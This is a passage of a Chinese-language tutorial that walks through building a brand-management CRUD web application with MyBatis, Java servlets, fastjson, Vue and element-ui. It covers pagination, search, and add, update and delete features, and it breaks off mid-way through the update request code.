&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--MySQL--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.34&lt;/version&gt; &lt;/dependency&gt; &lt;!--fastjson json转object时用到--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.62&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt; &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;!-- 这里可以配置tomcat的port和根路径 --&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 包在/scr/main/java中新建pojo、mapper、service、web、util等包 包名 作用 pojo 存放实体类，比如Brand、User等 mapper 存放对应的Mapper接口 比如BrandMapper service 存放提供服务的类BrandService web 存放web层使用到的Servlet util 存放工具包 创建src/main/resources/com/itheima/mapper/目录，该目录存放BrandMapper.xml 该文件在tomcat启动后自动保存到src/main/java/com/itheima/mapper/BrandMapper.xml 前端页面登录和注册页面使用html和javascript设计 展示页面使用Vue和element-ui设计出一个简单的展示页面 功能实现1.查询所有需求分析 当页面加载完成后，数据需要展示到出来，所以需要在Vue中mounted构造函数中写发送异步请求的代码 并且发送请求时无需携带参数 服务器返回所有数据，其格式为json格式，返回的参数绑定到vue的模型中，显示到页面中 后端实现dao在com.itheima.mapper.BrandMapper接口中添加selectAll()方法 /** * 查询所有 * @return */ @Select(&quot;select * from tb_brand&quot;) @ResultMap(&quot;brandResultMap&quot;) List&lt;Brand&gt; selectAll(); 由于表中有些字段名和实体类中的属性名没有对应，所以需要在 com/itheima/mapper/BrandMapper.xml 映射配置文件中定义结果映射 ，使用resultMap 标签。映射配置文件内容如下： &lt;resultMap id=&quot;brandResultMap&quot; type=&quot;brand&quot;&gt; &lt;result property=&quot;brandName&quot; column=&quot;brand_name&quot;/&gt; &lt;result property=&quot;companyName&quot; column=&quot;company_name&quot;/&gt; &lt;/resultMap&gt; service在com.itheima.mapper中创建BrandService类 // 获取sqlSessionFactory // 该类 存放在util包中，封装后方便使用 SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory(); /** * 查询所有 * @return */ public List&lt;Brand&gt; selectAll()&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); // 获取 BrandMapper BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); // 调用方法 List&lt;Brand&gt; brands = mapper.selectAll(); sqlSession.close(); // 返回查询到的数据 return brands; &#125; servlet在com.itheima.web中创建SelectAllServlet可以使用Idea提供的模板创建自动继承HttpServlet package com.itheima.web.servlet; import com.alibaba.fastjson.JSON; import com.itheima.pojo.Brand; import com.itheima.service.BrandService; import jdk.nashorn.internal.ir.CallNode; import javax.servlet.*; import javax.servlet.http.*; import javax.servlet.annotation.*; import java.io.IOException; import java.util.List; @WebServlet(value = &quot;/selectAllServlet&quot;) public class SelectAllServlet extends HttpServlet &#123; // 创建BrandService private BrandService service = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 调用BrandService中的selectAll方法 List&lt;Brand&gt; brandList = service.selectAll(); // 将brand对象转换为json字符串 String string = JSON.toJSONString(brandList); // 设置响应数据类型为json response.setContentType(&quot;text/json;charset=utf-8&quot;); //响应数据 response.getWriter().write(string); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现前端需要在页面加载完毕后发送 ajax 请求，所以发送请求的逻辑应该放在 mounted() 钩子函数中。而响应回来的数据需要赋值给表格绑定的数据模型，从代码中可以看出表格绑定的数据模型是 brandlist &lt;!--表格--&gt; &lt;template&gt; &lt;el-table :data=&quot;brandlist&quot; style=&quot;width: 100%&quot; :row-class-name=&quot;tableRowClassName&quot; @selection-change=&quot;handleSelectionChange&quot; &gt; ajax请求为 methods:&#123; selectAll()&#123; var _this = this; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27; &#125;).then(function(response)&#123; var brandlist = response.data; _this.brandlist = brandlist; &#125;) &#125; &#125; mounted()&#123; this.selectAll; &#125; 2.添加功能需求分析 用户请求后台时需要携带数据，且为post请求，携带的数据类型为json类型 后端服务器获取json数据后将其转换为Brand类型 添加成功后响应前端 后端实现dao在BrandMapper中添加addBrand()方法 /** * 添加 * @param brand */ @Insert(&quot;insert into tb_brand values (null, #&#123;brandName&#125;, #&#123;companyName&#125;, #&#123;ordered&#125;,#&#123;description&#125;, #&#123;status&#125;)&quot;) void addBrand(Brand brand); service在BrandService中实现addBrand()业务逻辑方法 /** * 添加 * @param brand */ public void addBrand(Brand brand)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.addBrand(brand); // 对数据库的增删改 记得提交事务 sqlSession.commit(); sqlSession.close(); &#125; servlet前端请求时携带json数据，request.getParamter()无法获取，需要使用获取请求体的方法request.getReader() package com.itheima.web.servlet; import com.alibaba.fastjson.JSON; import com.itheima.pojo.Brand; import com.itheima.service.BrandService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.util.List; @WebServlet(value = &quot;/addServlet&quot;) public class AddServlet extends HttpServlet &#123; private BrandService service = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // getParamter无法获取json数据 BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); // 将json数据转换为Brand对象 Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); service.addBrand(brand); // 返回的响应数据 response.getWriter().write(&quot;success&quot;); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现添加的对话框 初始时该对话框为隐藏状态，其状态有dialogVisible控制，默认情况下为false &lt;el-dialog title=&quot;添加品牌&quot; :visible.sync=&quot;dialogVisible&quot; width=&quot;30%&quot; &gt; 当点击添加按钮时，将dialogVisible设置为true，对话框弹出，便可以编辑数据 &lt;el-button type=&quot;primary&quot; plain @click=&quot;dialogVisible = true&quot;&gt;新增&lt;/el-button&gt; 提交数据对话框实际上是一个form表单，该表单数据与brand模型绑定，所以请求后端时提交brand即可 new Vue(&#123; data()&#123; return &#123; // 品牌模型数据 brand: &#123; status: &#x27;&#x27;, brandName: &#x27;&#x27;, companyName: &#x27;&#x27;, id:&quot;&quot;, ordered:&quot;&quot;, description:&quot;&quot; &#125;, &#125; &#125; &#125;) 提交和取消按钮 &lt;el-button type=&quot;primary&quot; @click=&quot;addBrand&quot;&gt;提交&lt;/el-button&gt; &lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt; &lt;el-button @click=&quot;dialogVisible = false&quot;&gt;取消&lt;/el-button&gt; addBrand // 添加数据 addBrand()&#123; var _this = this; this.currentPage=1 axios(&#123; method: &#x27;post&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/add&#x27;, data: brand = _this.brand &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // 隐藏对话框 _this.dialogVisible = false; // 重新加载全部数据 _this.selectAll(); _this.msgbox(&quot;添加成功！&quot;); &#125; &#125;) &#125; Servlet优化===Web 层的 Servlet 个数太多了，不利于管理和编写=== 通过之前的两个功能，我们发现每一个功能都需要定义一个 servlet，一个模块需要实现增删改查功能，就需要4个 servlet，模块一多就会造成servlet 泛滥。此时我们就想 servlet 能不能像 service 一样，一个模块只定义一个 servlet，而每一个功能只需要在该 servlet 中定义对应的方法。例如下面代码： @WebServlet(&quot;/brand/*&quot;) public class BrandServlet &#123; //查询所有 public void selectAll(...) &#123;&#125; //添加数据 public void add(...) &#123;&#125; //修改数据 public void update(...) &#123;&#125; //删除删除 public void delete(...) &#123;&#125; &#125; 而我们知道发送请求 servlet，tomcat 会自动的调用 service() 方法，之前我们在自定义的 servlet 中重写 doGet() 方法和 doPost() 方法，当我们访问该 servlet 时会根据请求方式将请求分发给 doGet() 或者 doPost() 方法 那么我们也可以仿照这样请求分发的思想，在 service() 方法中根据具体的操作调用对应的方法，如：查询所有就调用 selectAll() 方法，添加企业信息就调用 add() 方法。 为了做到通用，我们定义一个通用的 servlet 类，在定义其他的 servlet 是不需要继承 HttpServlet，而继承我们定义的 BaseServlet，在BaseServlet 中调用具体 servlet（如BrandServlet）中的对应方法。 public class BaseServlet extends HttpServlet &#123; @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //进行请求的分发 &#125; &#125; BrandServlet 定义就需要修改为如下： @WebServlet(&quot;/brand/*&quot;) public class BrandServlet extends BaseServlet &#123; //用户实现分页查询 public void selectAll(...) &#123;&#125; //添加企业信息 public void add(...) &#123;&#125; //修改企业信息 public void update(...) &#123;&#125; //删除企业信息 public void delete(...) &#123;&#125; &#125; 那么如何在 BaseServlet 中调用对应的方法呢？比如查询所有就调用 selectAll() 方法。 可以==规定在发送请求时，请求资源的二级路径（/brandServlet/selectAll）和需要调用的方法名相同==，如： 查询所有数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/selectAll 添加数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/add 修改数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/update 删除数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/delete 这样的话，在 BaseServlet 中就需要获取到资源的二级路径作为方法名，然后调用该方法 public class BaseServlet extends HttpServlet &#123; @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //1. 获取请求路径 String uri = req.getRequestURI(); // 例如路径为：/brand-case/brand/selectAll //2. 获取最后一段路径，方法名 int index = uri.lastIndexOf(&#x27;/&#x27;); String methodName = uri.substring(index + 1); // 获取到资源的二级路径 selectAll //2. 执行方法 //2.1 获取BrandServlet /UserServlet 字节码对象 Class //System.out.println(this); Class&lt;? extends BaseServlet&gt; cls = this.getClass(); //2.2 获取方法 Method对象 try &#123; Method method = cls.getMethod(methodName,？？？); //4,调用该方法 method.invoke(this,？？？); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; &#125; &#125; 通过上面代码发现根据方法名获取对应方法的 Method 对象时需要指定方法参数的字节码对象。解决这个问题，可以将方法的参数类型规定死，而方法中可能需要用到 request 对象和 response 对象，所以指定方法的参数为 HttpServletRequest 和 HttpServletResponse，那么 BrandServlet 代码就可以改进为： @WebServlet(&quot;/brand/*&quot;) public class BrandServlet extends BaseServlet &#123; //用户实现分页查询 public void selectAll(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //添加企业信息 public void add(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //修改企业信息 public void update(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //删除企业信息 public void delete(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; &#125; BaseServlet代码可以改进为： public class BaseServlet extends HttpServlet &#123; //根据请求的最后一段路径来进行方法分发 @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //1. 获取请求路径 String uri = req.getRequestURI(); // 例如路径为：/brand-case/brand/selectAll //2. 获取最后一段路径，方法名 int index = uri.lastIndexOf(&#x27;/&#x27;); String methodName = uri.substring(index + 1); // 获取到资源的二级路径 selectAll //2. 执行方法 //2.1 获取BrandServlet /UserServlet 字节码对象 Class //System.out.println(this); Class&lt;? extends BaseServlet&gt; cls = this.getClass(); //2.2 获取方法 Method对象 try &#123; Method method = cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class); //2.3 执行方法 method.invoke(this,req,resp); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; &#125; &#125; 前端需要改只有几个访问路径，这里不做具体实现 3.批量删除需求分析 批量删除请求，携带参数为[1,2,3...]类型的json字符串 后端接收到json字符串后需要将其转为int数组 调用BrandService中的方法删除数据 后端实现daoBrandMapper中添加deleteByIds()方法 /** * 批量删除 * @param ids */ void deleteByIds(@Param(&quot;ids&quot;) int[] ids); service在BrandService中实现批量删除的业务逻辑代码 /** * 批量删除 * @param ids */ public void deleteByIds(int[] ids)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.deleteByIds(ids); sqlSession.commit(); sqlSession.close(); &#125; servletsrc/main/java/com/itheima/web/servlet的BrandServlet添加deleteByIds方法 /** * 批量删除操作 * @param request * @param response * @throws ServletException * @throws IOException */ public void deleteByIds(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; BufferedReader reader = request.getReader(); // 获取json字符串 String line = reader.readLine(); System.out.println(line); int[] ids = JSON.parseObject(line, int[].class); System.out.println(ids); service.deleteByIds(ids); response.getWriter().write(&quot;success&quot;); &#125; 前端实现获取选中数据的id值handleSelectionChange &lt;el-table :data=&quot;brandlist&quot; style=&quot;width: 100%&quot; :row-class-name=&quot;tableRowClassName&quot; @selection-change=&quot;handleSelectionChange&quot; &gt; 可以看到当数据被选中后，multipleSelection会存放被选择的数据对象 // 复选框选中后执行的方法 handleSelectionChange(val) &#123; this.multipleSelection = val; console.log(this.multipleSelection) // console.log(this.multipleSelection) &#125;, 而我们所需要的只是对象的id值，因此需要遍历multipleSelection获取id值 // 从_this.multipleSelection获取brand的id值 for(let i=0; i&lt;_this.multipleSelection.length;i++)&#123; let selectItem = _this.multipleSelection[i]; _this.selectedIds[i] = selectItem.id; &#125; 批量删除提示删除操作一般比较危险因此需要让用户确认是否删除，在element-ui中找到$confirm组件实现该功能 deleteByIds()&#123; this.$confirm(&#x27;确定删除吗？&#x27;, &#x27;确认信息&#x27;, &#123; distinguishCancelAndClose: true, confirmButtonText: &#x27;确定&#x27;, cancelButtonText: &#x27;取消&#x27; &#125;).then(() =&gt; &#123; var _this = this; // 从_this.multipleSelection获取brand的id值 for(let i=0; i&lt;_this.multipleSelection.length;i++)&#123; let selectItem = _this.multipleSelection[i]; _this.selectedIds[i] = selectItem.id; &#125; axios(&#123; method: &#x27;post&#x27;, url:&quot;http://localhost:8080/brand-case/brand/deleteByIds&quot;, data: _this.selectedIds &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // 重新查询数据 _this.selectAll(); //显示提示框 _this.$message(&#123; type: &#x27;success&#x27;, message: &#x27;删除成功&#x27; &#125;); &#125; &#125;) &#125;).catch(() =&gt; &#123; this.$message(&#123; type: &#x27;info&#x27;, message: &quot;取消删除&quot; &#125;) &#125;); &#125; 4.分页查询需求分析分页查询sql分页查询也是从数据库进行查询的，所以我们要分页对应的SQL语句应该怎么写。分页查询使用 LIMIT 关键字，格式为：==LIMIT 开始索引 每页显示的条数==。以后前端页面在发送请求携带参数时，它并不明确开始索引是什么，但是它知道查询第几页。所以 开始索引 需要在后端进行计算，计算的公式是 ：==开始索引 = （当前页码 - 1）* 每页显示条数== 比如查询第一页的数据的 SQL 语句是： select * from tb_brand limit 0,5; 查询第二页的数据的 SQL 语句是： select * from tb_brand limit 5,5; 查询第三页的数据的 SQL 语句是： select * from tb_brand limit 10,5; 前后端数据分析分页查询功能时候比较复杂的，所以我们要先分析清楚以下两个问题： 前端需要传递什么参数给后端 根据上一步对分页查询 SQL 语句分析得出，前端需要给后端两个参数 当前页码 ： currentPage 每页显示条数：pageSize 后端需要响应什么数据给前端 上图是分页查询页面展示的效果，从上面我们可以看出需要响应以下联股份数据 当前页需要展示的数据。我们在后端一般会存储到 List 集合中 总共记录数。在上图页面中需要展示总的记录数，所以这部分数据也需要。总的页面 elementUI 的分页组件会自动计算，我们不需要关心 而这两部分需要封装到 PageBean 对象中，并将该对象转换为 json 格式的数据响应回给浏览器 通过上面的分析我们需要先在 pojo 包下创建 PageBean 类，为了做到通过会将其定义成泛型类，代码如下： //分页查询的JavaBean public class PageBean&lt;T&gt; &#123; // 总记录数 private int totalCount; // 当前页数据 private List&lt;T&gt; rows; public int getTotalCount() &#123; return totalCount; &#125; public void setTotalCount(int totalCount) &#123; this.totalCount = totalCount; &#125; public List&lt;T&gt; getRows() &#123; return rows; &#125; public void setRows(List&lt;T&gt; rows) &#123; this.rows = rows; &#125; &#125; 后端实现dao/** * 分页查询 * @param begin * @param size * @return */ @Select(&quot;select * from tb_brand limit #&#123;begin&#125;, #&#123;size&#125;&quot;) @ResultMap(&quot;brandResultMap&quot;) List&lt;Brand&gt; selectByPage(@Param(&quot;begin&quot;) int begin, @Param(&quot;size&quot;) int size); /** * 查询总记录数 * @return */ @Select(&quot;select count(*) from tb_brand&quot;) int selectTotalCount(); service /** * 分页查询 * @param currentPage * @param pageSize * @return */ public PageBean&lt;Brand&gt; selectByPage(int currentPage, int pageSize)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); // 根据公式计算起始值 int begin = (currentPage - 1) * pageSize; int size = pageSize; // 获取该页数据 List&lt;Brand&gt; rows = mapper.selectByPage(begin, size); // 获取总记录数 int totalCount = mapper.selectTotalCount(); // 创建PageBean对象 PageBean&lt;Brand&gt; pageBean = new PageBean&lt;&gt;(); pageBean.setRows(rows); pageBean.setTotalCount(totalCount); sqlSession.close(); return pageBean; &#125; servlet /** * 分页查询 * @param request * @param response * @throws ServletException * @throws IOException */ public void selectByPage(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; request.setCharacterEncoding(&quot;utf-8&quot;); // 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5 String _currentpage = request.getParameter(&quot;currentpage&quot;); String _pagesize = request.getParameter(&quot;pagesize&quot;); int currentpage = Integer.parseInt(_currentpage); int pagesize = Integer.parseInt(_pagesize); // 2.转为json PageBean&lt;Brand&gt; pageBean = service.selectByPage(currentpage, pagesize); String string = JSON.toJSONString(pageBean); // 响应数据 response.setContentType(&quot;text/json;charset=utf-8&quot;); response.getWriter().write(string); &#125; 前端实现分页工具条放在表单下面 &lt;!--分页工具条--&gt; &lt;el-pagination @size-change=&quot;handleSizeChange&quot; &lt;!--设置每页显示条数--&gt; @current-change=&quot;handleCurrentChange&quot; &lt;!--修改当前页码--&gt; :current-page=&quot;currentPage&quot; &lt;!--绑定currentPage模型--&gt; :page-sizes=&quot;[5, 10, 15, 20]&quot; :page-size=&quot;5&quot; layout=&quot;total, sizes, prev, pager, next, jumper&quot; :total=&quot;totalCount&quot;&gt; &lt;!--绑定totalCount模型--&gt; &lt;/el-pagination&gt; 修改handleSizeChange和handleCurrentChange handleSizeChange(val) &#123; // console.log(`每页 $&#123;val&#125; 条`); // 设置每页显示条数 this.pageSize = val; // 重新查询 this.selectAll(); // this.currentPage=1 &#125;, handleCurrentChange(val) &#123; this.currentPage = val; &#125;, 修改selectAll()异步请求方法主要修改url和获取响应数据后的处理方式 selectAll()&#123; // var _this = this; // axios(&#123; // method: &#x27;GET&#x27;, // url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27; // &#125;).then(function(response)&#123; // var brandlist = response.data; // _this.brandlist = brandlist; // &#125;) var _this = this; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/selectByPage?currentpage=&#x27;+ _this.currentPage + &#x27;&amp;pagesize=&#x27; + _this.pageSize &#125;).then(function(response)&#123; // 获取数据 &#123;rows: &#123; &#125;,totalCount:47&#125; var brandlist = response.data.rows; // 设置表格数据 _this.brandlist = brandlist; // 设置总记录数 _this.totalCount = response.data.totalCount; &#125;) &#125;, 5.多条件分页查询需求分析 用户提交数据 状态 品牌名称 企业名称， 绑定到brand模型后作为参数提交为后端 三个条件的查询为and关系，并且对品牌和企业的查询需要使用模糊查询即需要like关键字 查询后依然需要分页显示，因此需要返回符合条件的数据外，还要返回对应的数量 可以根据分页查询修改代码 后端实现dao需要两个查询，selelctByConditions和selectByConditionsCount /** * 多条件查询 * @param brand * @param begin * @param size * @return */ List&lt;Brand&gt; selectByConditions(@Param(&quot;brand&quot;) Brand brand, @Param(&quot;begin&quot;) int begin, @Param(&quot;size&quot;) int size); /** * 多条件查询的记录条数 * @param brand * @return */ int selectByConditionsCount(Brand brand); 在对应的BrandMapper.xml中实现具体的查询 &lt;select id=&quot;selectByConditions&quot; resultType=&quot;com.itheima.pojo.Brand&quot; resultMap=&quot;brandResultMap&quot;&gt; select * from tb_brand &lt;where&gt; &lt;!--这里有多个参数，访问brand数据实时需要使用brand.brandName--&gt; &lt;if test=&quot;brand.brandName != null and brand.brandName != &#x27;&#x27;&quot;&gt; and brand_name like #&#123;brand.brandName&#125; &lt;/if&gt; &lt;if test=&quot;brand.companyName != null and brand.companyName != &#x27;&#x27;&quot;&gt; and company_name like #&#123;brand.companyName&#125; &lt;/if&gt; &lt;if test=&quot;brand.status != null&quot;&gt; and status = #&#123;brand.status&#125; &lt;/if&gt; &lt;/where&gt; limit #&#123;begin&#125;, #&#123;size&#125; &lt;/select&gt; &lt;select id=&quot;selectByConditionsCount&quot; resultType=&quot;java.lang.Integer&quot;&gt; select count(*) from tb_brand &lt;where&gt; &lt;!--这里为单个参数，访问brand数据实时需要使用#&#123;brandName&#125;--&gt; &lt;if test=&quot;brandName != null and brandName != &#x27;&#x27;&quot;&gt; and brand_name like #&#123;brandName&#125; &lt;/if&gt; &lt;if test=&quot;companyName != null and companyName != &#x27;&#x27;&quot;&gt; and company_name like #&#123;companyName&#125; &lt;/if&gt; &lt;if test=&quot;status != null&quot;&gt; and status = #&#123;status&#125; &lt;/if&gt; &lt;/where&gt; &lt;/select&gt; service在BrandService中实现多条件分页查询的业务逻辑 /** * 多条件分页查询 * @param currentPage * @param pageSize * @return */ public PageBean&lt;Brand&gt; selectByConditionsPage(Brand brand, int currentPage, int pageSize)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); int begin = (currentPage - 1) * pageSize; int size = pageSize; // 对数据进行处理加上 % 模糊查询表达式 if(brand.getBrandName() != null &amp;&amp; brand.getBrandName().length() &gt; 0 )&#123; brand.setBrandName(&quot;%&quot; + brand.getBrandName() + &quot;%&quot;); &#125; if(brand.getCompanyName() != null &amp;&amp; brand.getCompanyName().length() &gt; 0)&#123; brand.setCompanyName(&quot;%&quot; + brand.getCompanyName() + &quot;%&quot;); &#125; System.out.println(brand); List&lt;Brand&gt; rows = mapper.selectByConditions(brand, begin, size); int totalCount = mapper.selectByConditionsCount(brand); PageBean&lt;Brand&gt; pageBean = new PageBean&lt;&gt;(); pageBean.setRows(rows); pageBean.setTotalCount(totalCount); sqlSession.close(); return pageBean; &#125; servlet/** * 搜索 * @param request * @param response * @throws ServletException * @throws IOException */ public void search(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5 String _currentpage = request.getParameter(&quot;currentpage&quot;); String _pagesize = request.getParameter(&quot;pagesize&quot;); int currentpage = Integer.parseInt(_currentpage); int pagesize = Integer.parseInt(_pagesize); // 2.获取json字符串 BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); // 3.将json字符串转为brand对象 Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); // 4.调用service方法 获取pageBean对象 PageBean&lt;Brand&gt; pageBean = service.selectByConditionsPage(brand, currentpage, pagesize); // 5.将PageBean转为Json字符串 String string = JSON.toJSONString(pageBean); // 6.发送响应数据 response.setContentType(&quot;text/json;charset=utf-8&quot;); response.getWriter().write(string); &#125; 前端实现获取查询条件查询表单绑定的模型为searchBrand &lt;el-form :inline=&quot;true&quot; :model=&quot;searchBrand&quot; class=&quot;demo-form-inline&quot;&gt; searchBrand数据如下 // 搜索数据 searchBrand:&#123; status: &#x27;&#x27;, brandName: &#x27;&#x27;, companyName: &#x27;&#x27;, id:&quot;&quot;, ordered:&quot;&quot;, description:&quot;&quot; &#125;, 当用户输入条件后，数据自动绑定到searchBrand模型上，向后台提交数据时，提交searchBrand即可 查询的异步请求search()&#123; var _this = this; axios(&#123; method: &#x27;POST&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/search?currentpage=&#x27;+ _this.currentPage + &#x27;&amp;pagesize=&#x27; + _this.pageSize, data: this.searchBrand &#125;).then(function(response)&#123; // 获取数据 &#123;rows: &#123; &#125; &#125; // 设置表格数据 _this.brandlist = response.data.rows; // 设置总记录数 _this.totalCount = response.data.totalCount; _this.currentPage = 1; &#125;) &#125; 6.删除单条数据需求分析 删除单条数据时需要携带该数据的id，使用get请求既可 获取id，可以使用scope.row.id 后端实现dao/** * 删除指定商品 * @param id */ @Delete(&quot;delete from tb_brand where id = #&#123;id&#125;&quot;) void deleteById(@Param(&quot;id&quot;) int id); service/** * 删除指定数据 * @param id */ public void deleteById(int id)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.deleteById(id); sqlSession.commit(); sqlSession.close(); &#125; servlet/** * 删除指定数据 * @param request * @param response * @throws ServletException * @throws IOException */ public void deleteById(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String _id = request.getParameter(&quot;id&quot;); int id = Integer.parseInt(_id); service.deleteById(id); response.getWriter().write(&quot;success&quot;); &#125; 前端实现获取id参考 在修改和删除按钮位置添加slot-scope=&quot;scope&quot; &lt;el-row slot-scope=&quot;scope&quot;&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;update(scope.row)&quot; &gt;修改&lt;/el-button&gt; &lt;el-button type=&quot;danger&quot; @click=&quot;deleteById(scope.row.id)&quot; &gt;删除&lt;/el-button&gt; &lt;/el-row&gt; 使用scope.row.id即可获取到每行数据的id 异步请求同样使用confirm组件提示用户是否真的想删除 deleteById(id)&#123; this.$confirm(&#x27;确定删除吗？&#x27;, &#x27;确认信息&#x27;, &#123; distinguishCancelAndClose: true, confirmButtonText: &#x27;确定&#x27;, cancelButtonText: &#x27;取消&#x27; &#125;).then(() =&gt; &#123; this.currentPage=1 var _this = this; var deleteId = id; axios(&#123; method: &#x27;get&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/deleteById?id=&#x27;+deleteId, &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // 重新查询数据 _this.selectAll(); //显示提示框 _this.$message(&#123; type: &#x27;success&#x27;, message: &#x27;删除成功&#x27; &#125;); &#125; &#125;) &#125;).catch(() =&gt; &#123; this.$message(&#123; type: &#x27;info&#x27;, message: &quot;取消删除&quot; &#125;) &#125;) &#125;, 7.修改需求分析 修改与添加类似，需要弹出对话框后进行数据的编辑 如何获取每行的数据，使用scope.row即可 请求数据为json数据，后台接收后将其转换为Brand类型后进行更新操作 后端实现dao/** * 更新数据 * @param brand */ @Update(&quot;update tb_brand set brand_name = #&#123;brandName&#125;,company_name = #&#123;companyName&#125;,ordered = #&#123;ordered&#125;,description = #&#123;description&#125;,status = #&#123;status&#125; where id = #&#123;id&#125;&quot;) @ResultMap(&quot;brandResultMap&quot;) void update(Brand brand); service/** * 更新数据 * @param brand */ public void update(Brand brand)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.update(brand); sqlSession.commit(); sqlSession.close(); &#125; servlet/** * 更新 * @param request * @param response * @throws ServletException * @throws IOException */ public void update(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); service.update(brand); response.getWriter().write(&quot;success&quot;); &#125; 前端实现修改对话框该对话框与增加对话的实现相同，不过该对话框初始时需要显示数据 &lt;el-button type=&quot;primary&quot; @click=&quot;update(scope.row)&quot; &gt;修改&lt;/el-button&gt; update函数的实现 update(data)&#123; var _this = this; this.dialogUpdateVisible = true; this.updateBrand.brandName = data.brandName; this.updateBrand.companyName = data.companyName; this.updateBrand.status = data.status; this.updateBrand.ordered = data.ordered; this.updateBrand.description = data.description; this.updateBrand.statusStr = data.statusStr; &#125;, updateBrand定义 data() &#123; return &#123; //带修改的数据 updateBrand:&#123; &quot;brandName&quot;: &quot;&quot;, &quot;companyName&quot;: &quot;&quot;, &quot;description&quot;: &quot;&quot;, &quot;id&quot;: 1, &quot;ordered&quot;: 0, &quot;status&quot;: 0, &quot;statusStr&quot;: &quot;&quot; &#125;, &#125; 异步请求实现修改对话框的提交按钮位置 &lt;el-form-item&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;updateSubmit&quot;&gt;提交&lt;/el-button&gt; &lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt; &lt;el-button @click=&quot;dialogUpdateVisible = false&quot;&gt;取消&lt;/el-button&gt; &lt;/el-form-item&gt; // 修改 updateSubmit()&#123; var _this = this; axios(&#123; method:&#x27;POST&#x27;, url: 